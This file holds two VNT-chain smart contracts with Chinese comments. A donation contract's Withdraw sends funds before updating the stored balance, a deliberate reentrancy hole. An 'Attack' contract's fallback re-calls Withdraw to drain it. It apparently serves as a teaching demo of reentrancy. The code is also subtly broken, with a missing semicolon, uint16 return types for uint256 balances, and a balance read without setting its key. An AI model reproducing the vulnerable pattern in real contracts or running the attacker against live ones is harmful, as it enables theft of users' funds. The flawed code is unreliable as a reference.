#include "vntlib.h"

// 账户地址
KEY mapping(address, uint) account;

constructor $Donate(){}

// 任何人可以向指定地址捐献以太币，受捐赠人可以提走自己受捐赠的币。
MUTABLE    // MUTABLE会修改状态变量
void $donate(){
    uint256 amount = GetValue();
    address from = GetSender();
    account.key = from;
    account.value = U256SafeAdd(account.value, amount);
}

// 根据合约地址获取金额
UNMUTABLE
uint16 GetAmountFromAddress(address addr)
{
  account.key = addr;
  return account.value;
}

UNMUTABLE  // UNMUTABLE不会修改状态变量, 根据合约地址获取金额
uint16 queryAmount(address to) {
    return GetAmountFromAddress(to);
}

// 提款
MUTABLE
void Withdraw(uint256 amount){
    address from = GetSender();
    uint256 balance = account.value;
    Require(U256_Cmp(U256SafeSub(balance, amount), 0) != -1, "No enough money to withdraw");
    if(balance >= amount) {
        TransferFromContract(from, amount)
        account.key = from;
        account.value = U256SafeSub(account.value, amount);
    }
}


#include "vntlib.h"

KEY address owner;

constructor Attack(){
    owner = GetSender();
}

// 结构体CallParams,结构体包含address,vnt,gas三个需要初始化的参数
CALL void Withdraw(CallParams params, uint256 amount);
CallParams params1 = {Address("donate.c"), U256(10000), 1000};
CALL void $donate(CallParams params);
CallParams params2 = {Address("donate.c"), U256(10000), 1000};

MUTABLE    // MUTABLE会修改状态变量
void attack() {
    $donate(params2);
    Withdraw(params1, 10);
}

$_() {
    Withdraw(params1, 10);
}








